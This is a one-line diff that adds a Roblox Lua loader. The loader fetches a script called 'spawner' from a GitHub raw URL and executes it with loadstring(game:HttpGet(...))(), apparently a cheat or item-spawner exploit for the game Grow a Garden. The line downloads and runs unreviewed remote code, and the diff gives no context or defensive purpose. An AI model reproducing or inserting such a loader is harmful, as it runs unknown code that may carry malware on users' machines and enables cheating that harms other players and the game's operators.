@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kauzz1/growagarden2/refs/heads/main/spawner"))()
